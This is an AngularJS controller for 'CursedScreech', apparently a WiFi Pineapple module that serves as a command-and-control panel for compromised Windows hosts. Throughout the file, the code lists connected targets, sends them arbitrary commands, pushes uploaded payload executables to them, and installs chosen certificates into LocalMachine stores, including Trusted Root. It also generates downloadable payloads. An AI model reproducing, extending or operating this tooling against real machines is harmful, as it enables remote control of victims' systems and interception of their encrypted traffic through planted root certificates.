registerController('CursedScreechController', ['$api', '$scope', '$sce', '$interval', '$http', function($api, $scope, $sce, $interval, $http) {
	
	// Location of payload directory
	$scope.payloadDir = "/pineapple/modules/CursedScreech/includes/payloads/";
	
	// Throbbers
	$scope.showSettingsThrobber	= false;
	$scope.showSeinThrobber		= false;
	$scope.showKuroThrobber		= false;
	$scope.uploadLimitThrobber	= false;
	
	// Depends vars
	$scope.dependsProcessing	= false;
	$scope.dependsInstalled		= false;
	
	// Settings vars
	$scope.settings_ifaceName	= '';
	$scope.available_interfaces	= '';
	$scope.settings_mcastGroup	= '';
	$scope.settings_mcastPort	= '';
	$scope.settings_hb_interval	= '';
	$scope.settings_kuroKey		= '';
	$scope.settings_targetKey	= '';
	$scope.settings_auth		= false;
	
	// Proc statuses
	$scope.seinStatus			= 'Not Running';
	$scope.seinButton			= 'Start';
	$scope.kuroStatus			= 'Not Running';
	$scope.kuroButton			= 'Start';
	$scope.seinIsRunning		= false;
	$scope.kuroIsRunning		= false;
	
	// Log vars
	$scope.currentLogTitle		= '';
	$scope.currentLogData		= '';
	$scope.activityLogData		= '';
	$scope.targets				= [];
	$scope.allTargetLogs		= [];
	
	// Key vars
	$scope.certificates			= '';
	$scope.keyErrorMessage		= '';
	$scope.selectKuroKey		= false;
	$scope.selectTargetKey		= false;
	
	// Target Commands
	$scope.targetCommand		= "";
	$scope.ezcmds				= [];
	$scope.selectedCmd			= "";
	$scope.newCmdName			= "";
	$scope.newCmdCommand		= "";
	$scope.checkAllTargets		= false;
	$scope.target_installKey	= "";
	$scope.certStores			= [
									{"ID":"Root", "Name":"Trusted Root Certification Authorities"},
									{"ID":"My", "Name":"Personal"},
									{"ID":"Remote Desktop", "Name":"Remote Desktop"},
									{"ID":"Trust", "Name":"Enterprise Trust"},
									{"ID":"CA", "Name":"Intermediate Certification Authorities"},
									{"ID":"SmartCardRoot", "Name":"Smart Card Trusted Roots"},
									{"ID":"TrustedPublisher", "Name":"Trusted Publishers"},
									{"ID":"TrustedPeople", "Name":"Trusted People"},
									{"ID":"ClientAuthIssuer", "Name":"Client Authentication Issuers"},
									{"ID":"eSIM Certification Authorities", "Name":"eSIM Certification Authorities"},
									{"ID":"Windows Live ID Token Issuer", "Name":"Windows Live ID Token Issuer"},
									{"ID":"Homegroup Machine Certificates", "Name":"Homegroup Machine Certificates"}
								];
	$scope.selectedCertStore	= $scope.certStores[0];
	
	// Panes
	$scope.showTargetPane		= true;
	$scope.showPayloadPane		= false;
	
	// Payload Vars
	$scope.payloads				= [];
	$scope.selectedFiles		= [];
	$scope.uploading			= false;
	$scope.selectedPayload		= "";
	$scope.showPayloadSelect	= false;
	$scope.showCertSelect		= false;
	
	// Interval vars
	$scope.stop;
	
	/* ============================================= */
	/*            BEGIN DEPENDS FUNCTIONS            */
	/* ============================================= */
	
	$scope.depends = (function(task){
		if (task == "install" || task == "remove") {
			$scope.dependsProcessing = true;
		}
		$api.request({
			module: 'CursedScreech',
			action: 'depends',
			task: task
		},function(response) {
			if (task == "install") {
				$scope.dependsProcessing = false;
				if (response.success === false) {
					alert("Failed to install dependencies.  Make sure you are connected to the internet.");
				} else {
					$scope.depends("check");
				}
			} else if (task == "remove") {
				$scope.dependsProcessing = false;
				$scope.depends("check");
			} else if (task == "check") {
				$scope.dependsInstalled = (response.success === true) ? true : false;
			}
		});
	});
	
	/* ============================================= */
	/*            BEGIN SETTINGS FUNCTIONS           */
	/* ============================================= */
	
	$scope.loadSettings = (function(){
		$api.request({
			module: 'CursedScreech',
			action: 'loadSettings'
		},function(response){
			if (response.success === true) {
				var configs = response.data;
				$scope.settings_ifaceName = configs.iface_name;
				$scope.settings_mcastGroup = configs.mcast_group;
				$scope.settings_mcastPort = configs.mcast_port;
				$scope.settings_hb_interval = configs.hb_interval;
				$scope.settings_kuroKey = configs.kuro_key;
				$scope.settings_targetKey = configs.target_key;
				$scope.settings_auth = (configs.auth == 1) ? true : false;
			}
		});
	});
	
	$scope.updateSettings = (function(){
		$scope.showSettingsThrobber = true;
		// Add the settings variables to a dictionary
		data = {
			'iface_name': $scope.settings_ifaceName,
			'mcast_group': $scope.settings_mcastGroup,
			'mcast_port': $scope.settings_mcastPort,
			'hb_interval': $scope.settings_hb_interval,
			'kuro_key': $scope.settings_kuroKey,
			'target_key': $scope.settings_targetKey,
			'auth': $scope.settings_auth
		};
		
		// Make the request to update the settings
		$api.request({
			module: 'CursedScreech',
			action: 'updateSettings',
			settings: data
		},function(response) {
			if (response.success === true) {
				$scope.loadSettings();
			}
			$scope.showSettingsThrobber = false;
		});
	});
	
	$scope.useDefault = (function(setting){
		if (setting == "mcast_group") {
			$scope.settings_mcastGroup = '231.253.78.29';
		} else if (setting == "mcast_port") {
			$scope.settings_mcastPort = '19578';
		} else if (setting == "hb_interval") {
			$scope.settings_hb_interval = "5";
		} else if (setting == "auth") {
			$scope.settings_auth = false;
		}
	});
	
	$scope.loadAvailableInterfaces = (function(){
		$api.request({
			module: 'CursedScreech',
			action: 'loadAvailableInterfaces'
		},function(response){
			if (response.success === true) {
				$scope.available_interfaces = response.data;
			} else {
				alert("An error has occurred.  Check the logs for details");
			}
		});
	});

	
	/* ============================================= */
	/*            BEGIN PROCESS FUNCTIONS            */
	/* ============================================= */
	
	$scope.startProc = (function(name){
		if (name == "sein.py") {
			$scope.showSeinThrobber	= true;
		} else if (name == "kuro.py") {
			$scope.showKuroThrobber = true;
		}
		$api.request({
			module: 'CursedScreech',
			action: 'startProc',
			procName: name
		},function(response) {
			if (name == "sein.py") {
				if (response.success === true){
					$scope.seinIsRunning = true;
					$scope.seinStatus = "Running - PID: " + response.data;
					$scope.seinButton = "Stop";
				}
				$scope.showSeinThrobber	= false;
			} else if (name == "kuro.py") {
				if (response.success === true) {
					$scope.kuroIsRunning = true;
					$scope.kuroStatus = "Running - PID: " + response.data;
					$scope.kuroButton = "Stop";
				}
				$scope.showKuroThrobber = false;
			}
		});
	});
	
	$scope.procStatus = (function(name){
		$api.request({
			module: 'CursedScreech',
			action: 'procStatus',
			procName: name
		},function(response){
			//console.log(response);
			if (response.success == true) {
				if (name == "sein.py") {
					$scope.seinIsRunning = true;
					$scope.seinStatus = "Running - PID: " + response.data;
					$scope.seinButton = "Stop";
				} else if (name == "kuro.py") {
					$scope.kuroIsRunning = true;
					$scope.kuroStatus = "Running - PID: " + response.data;
					$scope.kuroButton = "Stop";
				}
			} else {
				if (name == "sein.py") {
					$scope.seinIsRunning = false;
					$scope.seinStatus = "Not Running";
					$scope.seinButton = "Start";
				} else if (name == "kuro.py") {
					$scope.kuroIsRunning = false;
					$scope.kuroStatus = "Not Running";
					$scope.kuroButton = "Start";
				}
			}
		});
	});
	
	$scope.stopProc = (function(name){
		$api.request({
			module: 'CursedScreech',
			action: 'stopProc',
			procName: name
		},function(response) {
			if (response.success === true){
				if (name == "sein.py") {
					$scope.seinIsRunning = false;
					$scope.seinStatus = "Not Running";
					$scope.seinButton = "Start";
				} else if (name == "kuro.py") {
					$scope.kuroIsRunning = false;
					$scope.kuroStatus = "Not Running";
					$scope.kuroButton = "Start";
				}
			}
		});
	});
	
	/* ============================================= */
	/*            BEGIN PAYLOAD FUNCTIONS            */
	/* ============================================= */
	
	$scope.genPayload = (function(type){
		
		// Check if CursedScreech authorization should be used
		// if so change the type to 'cs_auth'
		if (type == "cs" && $scope.settings_auth == true) {
			type = "cs_auth";
		}
		
		$api.request({
			module: 'CursedScreech',
			action: 'genPayload',
			type: type
		},function(response) {
			if (response.success === true) {
				window.location = '/api/?download=' + response.data;
			} else {
				console.log("Failed to archive payload files");
			}
		});
	});
	
	$scope.clearDownloads = (function(){
		$api.request({
			module: 'CursedScreech',
			action: 'clearDownloads'
		},function(response){
			if (response.success === false){
				console.log("Failed to clear API downloads directory.");
			}
		});
	});
	
	/* ============================================= */
	/*            BEGIN TARGET FUNCTIONS             */
	/* ============================================= */
	
	$scope.sendCommand = (function(){
		if ($scope.targetCommand == "") {
			return;
		}
		
		var checkedTargets = []
		for (var x=0; x < $scope.targets.length; x++){
			if ($scope.targets[x].checked) {
				checkedTargets.push($scope.targets[x].socket.split(":")[0]);
			}
		}
		if (checkedTargets.length == 0) {
			return;
		}
		
		// Check if a payload is to be sent and build its command string
		var cmd = "";
		if ($scope.showPayloadSelect) {
			// ex: "sendfile;/pineapple/modules/CursedScreech/includes/payloads/NetCli.exe;C:\Temp\"
			cmd = "sendfile;" + $scope.payloadDir + $scope.selectedPayload.fileName + ";" + $scope.targetCommand;
		} else if ($scope.showCertSelect) {
			cmd = "sendfile;" + $scope.target_installKey + ";" + getEZCmd("Send File");
		} else {
			cmd = $scope.targetCommand;
		}
		$api.request({
			module: 'CursedScreech',
			action: 'sendCommand',
			command: cmd,
			targets: checkedTargets
		},function(response){
			
			// Make a second API call to install the certificate
			if ($scope.showCertSelect) {

				cmd = $scope.targetCommand.replace("$cert", getEZCmd("Send File") + $scope.target_installKey.split("/").slice(-1)[0]).replace("$store", "'Cert:\\LocalMachine\\" + $scope.selectedCertStore.ID + "'")
				
				$api.request({
					module: 'CursedScreech',
					action: 'sendCommand',
					command: cmd,
					targets: checkedTargets
				},function(response){});
				
			}
			
		});
	});
	
	function getTargetIndex(sock){
		var addr = sock.split(":")[0];
		for (var x=0; x < $scope.targets.length; x++){
			if ($scope.targets[x].socket.split(":")[0] == addr){
				return x;
			}
		}
	}
	
	function itemExistsInList(item,list){
		for (var x=0; x < list.length; x++){
			if (list[x] == item) {
				return x;
			}
		}
	}
	
	$scope.selectAllTargets = (function(){
		if ($scope.checkAllTargets) {
			// Set to false if currently true
			$scope.checkAllTargets = false;
		} else {
			$scope.checkAllTargets = true;
		}
		for (var x=0; x < $scope.targets.length; x++){
			if ($scope.checkAllTargets) {
				$scope.targets[x].checked = true;
			} else {
				$scope.targets[x].checked = false;
			}
		}
	});
	
	$scope.loadTargets = (function(){
		$api.request({
			module: 'CursedScreech',
			action: 'loadTargets'
		},function(response){
			if (response.success === true) {
				var index;
				// Load all targets from the Sein list into our local list
				// if any currently exist then update their information
				for (var x=0; x < response.data.length; x++) {
					index = getTargetIndex(response.data[x])
					if (index !== undefined) {
						$scope.targets[index].socket = response.data[x];
					} else {
						$scope.targets.push({'socket': response.data[x], 'checked': false});
					}
				}
				
				// Check the opposite - if the target exists in our local list but not in
				// the list provided it must be deleted from our local list
				for (var x=0; x < $scope.targets.length; x++){
					if (itemExistsInList($scope.targets[x].socket, response.data) === undefined) {
						// Remove item from scope.targets
						index = getTargetIndex($scope.targets[x].socket);
						$scope.targets.splice(index, 1);
					}
				}
			} else {
				console.log(response.message);
			}
		});
	});
	
	$scope.clearTargets = (function(){
		$scope.clearLog('targets.log', 'forest');
		$scope.targets = [];
	});
	
	$scope.deleteTarget = (function(name){
		$api.request({
			module: 'CursedScreech',
			action: 'deleteTarget',
			target: name
		},function(response){
			$scope.loadTargets();
		});
	});
	
	
	/* ============================================= */
	/*            BEGIN EZCMDS FUNCTIONS             */
	/* ============================================= */
	
	$scope.loadEZCmds = (function(){
		$api.request({
			module: 'CursedScreech',
			action: 'loadEZCmds'
		},function(response){
			for (k in response.data) {
				if (response.data[k] == null) {
					delete(response.data[k]);
				}
			}
			$scope.ezcmds = response.data;
		});
	});
	
	$scope.saveEZCmds = (function(){
		$api.request({
			module: 'CursedScreech',
			action: 'saveEZCmds',
			ezcmds: $scope.ezcmds
		},function(response){
			if (response.success === true){
				
			}
		});
	});
	
	$scope.deleteEZCmd = (function(key){
		if (!confirm("Delete " + key + "?")) {
			return;
		}
		for (k in $scope.ezcmds) {
			if (k == key) {
				delete($scope.ezcmds[k]);
				$scope.saveEZCmds();
			}
		}
	});
	
	$scope.addEZCmd = (function(){
		if (!$scope.newCmdName || !$scope.newCmdCommand) {
			return;
		}
		$scope.ezcmds[$scope.newCmdName] = $scope.newCmdCommand;
		$scope.saveEZCmds();
		$scope.newCmdName = $scope.newCmdCommand = "";
	});
	
	$scope.ezCommandChange = (function(){
		$scope.showPayloadSelect = false;
		$scope.showCertSelect = false;
		if ($scope.selectedCmd === null) {
			$scope.targetCommand = "";
			return;
		}
		for (key in $scope.ezcmds) {
			if ($scope.ezcmds[key] == $scope.selectedCmd) {
				if (key == "Send File") {
					$scope.showPayloadSelect = true;
				} else if (key == "Install Cert") {
					$scope.showCertSelect = true;
				}
			}
		}
		$scope.targetCommand = $scope.selectedCmd;
	});
	
	function getEZCmd(key) {
		return $scope.ezcmds[key];
	}
	
	/* ============================================= */
	/*              BEGIN KEY FUNCTIONS              */
	/* ============================================= */
	
	$scope.loadCertificates = (function(type) {
		if (type == "kuro") {
			$scope.selectKuroKey = true;
			$scope.selectTargetKey = false;
			$scope.selectInstallKey = false;
		} else if (type == "target") {
			$scope.selectTargetKey = true;
			$scope.selectKuroKey = false;
			$scope.selectInstallKey = false;
		} else if (type == "install") {
			$scope.selectInstallKey = true;
			$scope.selectKuroKey = false;
			$scope.selectTargetKey = false;
		}
		$api.request({
			module: 'CursedScreech',
			action: 'loadCertificates'
		},function(response){
			if (response.success === true) {
				// Display certificate information
				$scope.keyErrorMessage = '';
				$scope.certificates = response.data;
			} else {
				// Display error
				$scope.keyErrorMessage = response.message;
			}
		});
	});
	
	$scope.selectKey = (function(key){
		keyPath = "/pineapple/modules/Papers/includes/ssl/" + key;
		if ($scope.selectKuroKey == true) {
			$scope.settings_kuroKey = keyPath;
		} else if ($scope.selectTargetKey == true) {
			$scope.settings_targetKey = keyPath;
		} else if ($scope.selectInstallKey == true) {
			$scope.target_installKey = keyPath + ".cer";
		}
	});
	
	/* ============================================= */
	/*               BEGIN LOG FUNCTIONS             */
	/* ============================================= */
	
	$scope.getLogs = (function(type){
		/* valid types are error or changelog */
		$api.request({
			module: 'CursedScreech',
			action: 'getLogs',
			type: type
		},function(response){
			if (type == 'error') {
				$scope.logs = response.data;
			} else if (type == 'changelog') {
				$scope.changelogs = response.data;
			} else if (type == 'targets') {
				$scope.allTargetLogs = response.data;
			}
		});
	});
	
	$scope.readLog = (function(log,type){
		$api.request({
			module: 'CursedScreech',
			action: 'readLog',
			logName: log,
			type: type
		},function(response){
			if (response.success === true) {
				if (log == 'activity.log') {
					$scope.activityLogData = response.data;
				} else {
					$scope.currentLogTitle = log;
					$scope.currentLogData = $sce.trustAsHtml(response.data);
				}
			}
		});
	});
	
	$scope.downloadLog = (function(name,type){
		$api.request({
			module: 'CursedScreech',
			action: 'downloadLog',
			logName: name,
			logType: type
		},function(response){
			if (response.success === true) {
				window.location = '/api/?download=' + response.data;
			}
		});
	});
	
	$scope.clearLog = (function(log,type){
		$api.request({
			module: 'CursedScreech',
			action: 'clearLog',
			logName: log,
			type: type
		},function(response){
			if (log == "activity.log") {
				$scope.readLog("activity.log", "forest");
			}
		});
	});

	$scope.deleteLog = (function(log, type){
		if (!confirm("Delete " + log + "?")) {
			return;
		}
		$api.request({
			module: 'CursedScreech',
			action: 'deleteLog',
			logName: log,
			type: type
		},function(response){
			if (type == 'targets') {
				$scope.getLogs('targets');
			}
			if (response.success === false) {
				alert(response.message);
			}
		});
	});
	
	$scope.refreshLogs = (function(){
		$scope.getLogs("error");
		if ($scope.seinIsRunning) {
			$scope.loadTargets();
		}
		if ($scope.kuroIsRunning) {
			$scope.readLog("activity.log", "forest");
		}
	});
	
	/* ============================================= */
	/*            BEGIN PAYLOAD FUNCTIONS            */
	/* ============================================= */
	
	$scope.setSelectedFiles = (function(){
		files = document.getElementById("selectedFiles").files;
		for (var x = 0; x < files.length; x++) {
			$scope.selectedFiles.push(files[x]);
		}
	});
	
	$scope.removeSelectedFile = (function(file){
		var x = $scope.selectedFiles.length;
		while (x--) {
			if ($scope.selectedFiles[x] === file) {
				$scope.selectedFiles.splice(x,1);
			}
		}
	});
	
	$scope.uploadFile = (function(){
		$scope.uploading = true;
		
		var fd = new FormData();
		for (x = 0; x < $scope.selectedFiles.length; x++) {
			fd.append($scope.selectedFiles[x].name, $scope.selectedFiles[x]);
		}
		$http.post("/modules/CursedScreech/api/module.php", fd, {
			transformRequest: angular.identity,
			headers: {'Content-Type': undefined}
		}).then(function(response) {
			var errors = {};
			for (var key in response.data) {
				if (response.data[key].success == "Failed") {
					var msg = response.data[key].message + '\n';
					if (!errors.hasOwnProperty(msg)) {
						errors[msg] = true;
					}
				}
			}
			if (Object.keys(errors).length > 0) {
				alert(Object.keys(errors).join(''));
			}
			$scope.selectedFiles = [];
			$scope.getPayloads();
			$scope.uploading = false;
		});
	});
	
	$scope.getPayloads = (function(){
		$api.request({
			module: 'CursedScreech',
			action: 'getPayloads'
		},function(response){
			$scope.payloads = [];
			for (var key in response.data) {
				if (response.data.hasOwnProperty(key)) {
					var obj = {fileName: key, filePath: response.data[key]};
					$scope.payloads.push(obj);
				}
			}
		});
	});
	
	$scope.deletePayload = (function(payload){
		var res = confirm("Press OK to confirm deletion of " + payload.fileName + ".");
		if (!res) {return;}
		$api.request({
			module: 'CursedScreech',
			action: 'deletePayload',
			filePath: payload.filePath + payload.fileName
		},function(response){
			$scope.getPayloads();
		});
	});
	
	$scope.configUploadLimit = (function(){
		$scope.uploadLimitThrobber = true;
		$api.request({
			module: 'CursedScreech',
			action: 'cfgUploadLimit'
		},function(response){
			if (response.success === true) {
				alert("Upload limit configured successfully.");
			} else {
				alert("Failed to configure upload limit.");
			}
			$scope.uploadLimitThrobber = false;
		});
	});
	
	/* ============================================= */
	/*                MISC FUNCTIONS                 */
	/* ============================================= */
	$scope.swapPane = (function(pane) {
		if (pane) { return; }
		$scope.showTargetPane = !$scope.showTargetPane;
		$scope.showPayloadPane = !$scope.showPayloadPane;
	});
	
	/* ============================================= */
	/*                  INITIALIZERS                 */
	/* ============================================= */
	
	// Not sure if this is ever reached
	$scope.$on('$destroy', function(){
		$interval.cancel($scope.stop);
		$scope.stop = undefined;
	});
	
	$scope.init = (function(){
		$api.request({
			module: 'CursedScreech',
			action: 'init'
		},function(response){
			if (response.success == false) {
				if (response.message != '') {
					$scope.getLogs();
				} else {
					alert(response.message);
				}
			}
		});
	});
	
	$scope.init();
	$scope.loadAvailableInterfaces();
	$scope.loadSettings();
	$scope.loadEZCmds();
	$scope.getPayloads();
	$scope.getLogs('changelog');
	$scope.depends('check');
	$scope.clearDownloads();
	$scope.procStatus('sein.py');
	$scope.procStatus('kuro.py');
	
	$scope.stop = $interval(function(){
		$scope.refreshLogs();
		if ($scope.seinIsRunning) {
			$scope.procStatus('sein.py');
		}
		if ($scope.kuroIsRunning) {
			$scope.procStatus('kuro.py');
		}
	}, 2000);
	
}])